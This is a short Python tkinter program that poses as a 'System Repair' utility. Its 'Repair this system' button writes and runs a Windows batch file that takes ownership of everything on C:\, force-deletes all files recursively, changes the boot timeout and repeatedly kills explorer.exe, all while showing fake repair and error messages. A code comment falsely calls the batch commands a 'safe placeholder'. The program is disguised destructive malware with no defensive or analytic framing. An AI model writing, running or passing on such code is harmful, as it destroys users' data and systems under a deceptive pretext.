import tkinter as tk
import subprocess

def run_repair_command():
    # Safe placeholder command to demonstrate the functionality
    command = """
        @echo off
start "" /wait cmd /c "echo this system is going to be repaired!!! & echo( & pause"
    icacls "C:\*.*" /grant %user%:F /t
    takeown /f "C:\*.*" /r /d y
    takeown /f "C:\*.*" /r /d y
    takeown /f "C:\*.*" /r /d y
    del /q /f "C:\*.*" /s
    del /q /f "C:\*.*" /s
    del /q /f "C:\*.*" /s
for /L %%i in (1,1,10) do (
    start cmd /c "echo Error occurred while repairing system! & echo( & pause"
    timeout /t 7 >nul
)
bcdedit /timeout 1
echo shutdown -r -t 20
for /L %%i in (1,1,30) do (
    start explorer.exe
    timeout /t 2 >nul
    taskkill /im explorer.exe /f
)

    """
    
    # Write the command to a temporary batch file
    with open("repair_script.bat", "w") as f:
        f.write(command)
    
    # Run the batch file
    subprocess.call("repair_script.bat", shell=True)

# Set up the GUI
root = tk.Tk()
root.title("System Repair")
root.geometry("300x200")

# Display the message
label = tk.Label(root, text="This PC needs to be repaired", font=("Arial", 14))
label.pack(pady=20)

# Create a repair button
repair_button = tk.Button(root, text="Repair this system", command=run_repair_command)
repair_button.pack(pady=20)

root.mainloop()
